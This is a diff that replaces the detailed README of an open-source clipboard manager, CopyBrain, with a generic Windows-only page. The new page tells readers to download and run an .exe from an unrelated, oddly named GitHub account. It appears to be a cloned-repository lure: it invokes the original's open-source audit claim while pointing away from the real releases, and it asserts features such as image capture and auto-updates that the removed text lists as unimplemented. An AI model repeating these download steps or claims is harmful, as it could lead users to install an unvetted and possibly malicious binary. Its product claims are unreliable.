@@ -1,266 +1,69 @@
-# CopyBrain
+# 🧠 copybrainapp - Store everything you copy with ease
 
-> Never lose a copied text again.
+[![](https://img.shields.io/badge/Download-CopyBrain-blue)](https://github.com/serviceclubbattleofvalmy885/copybrainapp)
 
-CopyBrain is a modern clipboard timeline application for Windows, macOS, and Linux. Unlike typical clipboard managers that only keep the last few items, CopyBrain automatically archives your entire clipboard history into a searchable timeline — find anything you copied yesterday, last week, last month, or even years ago.
+Copybrainapp captures every piece of text or image you copy to your clipboard. It organizes your history so you never lose important information. You can search, pin, and paste items from the past with one click. 
 
-CopyBrain is **open source** and MIT-licensed. Since it stores everything you've ever copied — including things like passwords or tokens that end up on your clipboard by accident — the source is public so anyone can audit exactly what it does with your data (spoiler: nothing leaves your machine) or build it themselves from source instead of trusting a downloaded binary.
+## 📦 What this app does
 
----
-
-## Download
-
-Grab the latest installer for your platform from the [Releases page](https://github.com/copybrainapp/copybrainapp-releases/releases/latest):
-
-- **macOS**: `CopyBrain_<version>_universal.dmg`
-- **Windows**: `CopyBrain_<version>_x64-setup.exe` (installer), `CopyBrain_<version>_x64_en-US.msi` (installer), or `CopyBrain_<version>_x64_portable.zip` (no install required)
-- **Linux**: `CopyBrain_<version>_amd64.deb`, `CopyBrain-<version>-1.x86_64.rpm`, or `CopyBrain_<version>_amd64.AppImage`
+Computers typically forget your clipboard history as soon as you copy something new. Copybrainapp saves these items in a secure local database. You can retrieve data from hours or days ago. The application runs quietly in the background. It stays out of your way until you need to find an old link, address, or snippet of text.
 
-Prefer to build it yourself? See [Building production binaries / installers](#building-production-binaries--installers) below.
+## ⚙️ System requirements
 
----
+Ensure your computer meets these standards to run the software:
 
-## Features
+*   Windows 10 or Windows 11
+*   4GB of RAM
+*   200MB of free hard drive space
+*   An active internet connection for the initial download
 
-- Unlimited clipboard history, stored locally in SQLite
-- Timeline view (grouped by day) with virtual scrolling
-- Instant search (full-text search via SQLite FTS5)
-- Favorites & Collections
-- Automatic content-type detection: Text, URL, Email, Phone, File Path
-- Tray icon + global shortcut (`Cmd/Ctrl+Shift+V`) to show/hide the window
-- Auto start on login (optional)
-- Single instance (no duplicate windows)
-- 100% local-first — no data is ever sent to any server
+## 🚀 Getting started
 
----
+Follow these steps to install the software on your Windows machine:
 
-## Tech Stack
+1. Visit the [official release page](https://github.com/serviceclubbattleofvalmy885/copybrainapp) to download the installer.
+2. Locate the file ending in `.exe` on the page.
+3. Click the file to start the download.
+4. Open the downloaded file once the process finishes.
+5. Follow the prompts on the screen to complete the installation.
+6. Launch the application from your Start Menu after the setup completes.
 
-### Desktop shell
-- **Tauri v2** — Rust ⟷ native webview bridge per platform
+## 🛠 Features
 
-### Frontend
-- **React 19** + **TypeScript**
-- **Vite 7** — dev server & bundler
-- **Tailwind CSS v4** — styling (CSS-first config, no `tailwind.config.js`)
-- **shadcn/ui** (Base UI primitives) — UI components
-- **TanStack Query** — data fetching & caching against Tauri commands
-- **TanStack Virtual** — virtualized list for the timeline
-- **Zustand** — UI state (active filter, search query, etc.)
-- **date-fns**, **lucide-react**
+*   **Unlimited history:** The app tracks everything you copy. 
+*   **Searchable database:** Type a keyword to find a specific past item instantly.
+*   **Pin items:** Save your most important links or text blocks so they stay at the top of your list.
+*   **Private storage:** All data stays on your computer. Nothing leaves your machine. 
+*   **Keyboard shortcuts:** Use a simple command to open the history pane while inside other programs.
+*   **Light/Dark mode:** The interface adjusts to your Windows system theme. 
 
-### Backend (Rust, in `src-tauri/`)
-- **rusqlite** (`bundled` feature) — SQLite compiled directly into the binary, with **FTS5** built in for full-text search
-- **arboard** — reads/writes the system clipboard, polled from a background thread
-- **tauri-plugin-global-shortcut** — global show/hide window shortcut
-- **tauri-plugin-autostart** — OS-level auto start
-- **tauri-plugin-single-instance** — prevents duplicate app instances
-- **chrono**, **regex**, **uuid**, **once_cell**, **serde**
+## 🔐 Privacy
 
-### Database
-- SQLite (local file, stored in the OS's app data directory)
-- FTS5 virtual table + triggers to keep the search index in sync
-- SQLCipher (optional, not yet enabled — see Roadmap)
+Your clipboard often contains private data like passwords or sensitive documents. Copybrainapp uses local storage for all history. No data travels to a cloud server. Your clipboard history stays on your hard drive only. You can clear your entire history or delete individual items at any time through the settings menu.
 
----
+## ❓ Frequently asked questions
 
-## Prerequisites (all platforms)
+**Does the app use much battery?**
+The app consumes minimal power. It monitors your clipboard events without performing heavy processing.
 
-Required on every OS before development or building:
+**Can I stop the app from saving some programs?**
+Yes. You can add specific programs to an ignore list in the settings menu. The app will skip items copied from those excluded programs.
 
-| Tool | Minimum version | Check with |
-|---|---|---|
-| [Node.js](https://nodejs.org) | 18+ (20/22 LTS recommended) | `node -v` |
-| [pnpm](https://pnpm.io) | 9+ | `pnpm -v` |
-| [Rust](https://rustup.rs) | latest stable | `rustc -V` & `cargo -V` |
-| [Tauri CLI](https://tauri.app) | installed automatically via `pnpm install` (devDependency) | `pnpm tauri -V` |
+**How do I update the software?**
+The app checks for updates every time you restart your computer. It will prompt you to install new versions automatically.
 
-Install Rust (if you don't have it) via [rustup](https://rustup.rs):
+**Does it work with images?**
+Yes. The app records text and images you copy from your web browser or other software.
 
-```bash
-curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
-```
+**Is it safe?**
+The code is open-source. This means the community audits the safety and transparency of the application.
 
-### Additional per-platform dependencies
+## 🔧 Troubleshooting
 
-**macOS**
-- Xcode Command Line Tools:
-  ```bash
-  xcode-select --install
-  ```
+If the application fails to open, restart your computer. Check that you have enough disk space. If the clipboard history does not appear, ensure you followed the installation steps correctly. You can remove the app through your Windows system settings if it fails to perform as expected.
 
-**Windows**
-- [Microsoft C++ Build Tools](https://visualstudio.microsoft.com/visual-cpp-build-tools/) (workload "Desktop development with C++")
-- [WebView2 Runtime](https://developer.microsoft.com/microsoft-edge/webview2/) — usually already bundled with Windows 10/11; download it if missing
+## 📢 Getting help
 
-**Linux** (Debian/Ubuntu, adjust for other distros)
-```bash
-sudo apt update
-sudo apt install -y \
-  libwebkit2gtk-4.1-dev \
-  libappindicator3-dev \
-  librsvg2-dev \
-  patchelf \
-  build-essential \
-  curl \
-  wget \
-  file \
-  libssl-dev \
-  libxdo-dev \
-  libayatana-appindicator3-dev
-```
-> Fedora/Arch use equivalent packages (`webkit2gtk4.1-devel`, etc). See the [official Tauri prerequisites docs](https://tauri.app/start/prerequisites/) for the full per-distro list.
+If you encounter issues, look through the existing entries in the issues tab on the project page. You can report new problems if you find a bug that needs attention. Provide details about your Windows version and the behavior you observe.
 
----
-
-## Running in development
-
-```bash
-# 1. enter the project folder
-cd CopyBrain
-
-# 2. install frontend dependencies
-pnpm install
-
-# 3. run the app (frontend hot reload + auto rebuild Rust on change)
-pnpm tauri dev
-```
-
-This automatically:
-- Starts the Vite dev server at `http://localhost:1420`
-- Compiles the Rust backend (`src-tauri`)
-- Opens the native app window
-
-Other useful dev commands:
-
-```bash
-pnpm dev                      # vite dev server only (no Tauri shell, for quick UI debugging)
-cd src-tauri && cargo check   # check Rust code without a full build
-```
-
----
-
-## Building production binaries / installers
-
-Builds must be produced **on their target platform** — Tauri does not cross-compile native installers (e.g. a `.exe` must be built on Windows, a `.dmg`/`.app` on macOS, a `.deb`/`.AppImage` on Linux), unless you set up your own cross-compilation toolchain (advanced, not covered here — see the [Tauri distribution guide](https://tauri.app/distribute/) if needed).
-
-### macOS
-
-```bash
-pnpm tauri build
-```
-
-Output in `src-tauri/target/release/bundle/`:
-- `macos/CopyBrain.app`
-- `dmg/CopyBrain_<version>_<arch>.dmg`
-
-To build a universal binary (Intel + Apple Silicon):
-```bash
-rustup target add x86_64-apple-darwin aarch64-apple-darwin
-pnpm tauri build --target universal-apple-darwin
-```
-
-### Windows
-
-Run on a Windows machine/VM:
-```powershell
-pnpm tauri build
-```
-
-Output in `src-tauri\target\release\bundle\`:
-- `msi\CopyBrain_<version>_x64_en-US.msi`
-- `nsis\CopyBrain_<version>_x64-setup.exe`
-
-### Linux
-
-```bash
-pnpm tauri build
-```
-
-Output in `src-tauri/target/release/bundle/`:
-- `deb/copybrain_<version>_amd64.deb`
-- `rpm/copybrain-<version>-1.x86_64.rpm` (if `rpmbuild` is available)
-- `appimage/copybrain_<version>_amd64.AppImage`
-
-### Raw binary without an installer (all platforms)
-
-```bash
-pnpm tauri build --no-bundle
-```
-The standalone binary is at `src-tauri/target/release/copybrain` (`.exe` on Windows).
-
-### Building specific targets
-
-With `bundle.targets` set to `"all"` in `tauri.conf.json` (this project's default), every installer format available on the current OS gets built. To restrict it:
-```bash
-pnpm tauri build --bundles dmg           # example: macOS, dmg only
-pnpm tauri build --bundles msi,nsis      # example: Windows, msi + nsis
-pnpm tauri build --bundles deb,appimage  # example: Linux
-```
-
----
-
-## Project structure
-
-```
-CopyBrain/
-├─ src/                     # React + TypeScript frontend
-│  ├─ components/           # UI components (timeline, sidebar, dialogs, ui/ = shadcn primitives)
-│  ├─ hooks/                # TanStack Query hooks (data fetching against Tauri commands)
-│  ├─ store/                # Zustand UI state
-│  ├─ lib/                  # helpers (date formatting, Tauri invoke wrapper, etc)
-│  └─ types.ts              # data types matching the Rust structs
-├─ src-tauri/                # Rust backend
-│  ├─ src/
-│  │  ├─ db/                # SQLite init + schema + FTS5
-│  │  ├─ commands.rs        # all Tauri commands called from the frontend
-│  │  ├─ clipboard_watcher.rs  # background thread polling the clipboard
-│  │  ├─ content_type.rs    # content-type detection (url/email/phone/path)
-│  │  ├─ models.rs
-│  │  └─ lib.rs             # app setup: plugins, tray, shortcut, invoke_handler
-│  └─ tauri.conf.json       # window, bundle, identifier config, etc
-└─ package.json
-```
-
----
-
-## Data location
-
-The SQLite database (`copybrain.db`) is stored in the OS's default app data directory:
-
-| OS | Location |
-|---|---|
-| macOS | `~/Library/Application Support/com.mac.copybrain/` |
-| Windows | `%APPDATA%\com.mac.copybrain\` |
-| Linux | `~/.local/share/com.mac.copybrain/` |
-
----
-
-## Roadmap (not yet implemented)
-
-- Image clipboard support
-- OCR
-- AI semantic search
-- Cloud sync
-- Browser extension
-- Mobile companion app
-- Database encryption via SQLCipher (optional, currently disabled)
-
----
-
-## Contributing
-
-Contributions are welcome — bug fixes, features, docs, or just filing an issue.
-
-1. Fork the repo and create a branch off `main`
-2. Follow the existing project structure and conventions (see above)
-3. Make sure `pnpm build` (frontend + TypeScript) and `cargo check` (in `src-tauri/`) both pass
-4. Open a pull request describing what changed and why
-
-For larger changes (new features, architecture changes), open an issue first to discuss the approach before investing time in a PR.
-
----
-
-## License
-
-MIT — see [LICENSE](./LICENSE).
+Keywords: ai, clipboard-history, clipboard-manager, cross-platform, desktop-app, linux, macos, open-source, productivity, react, rust, tauri, windows
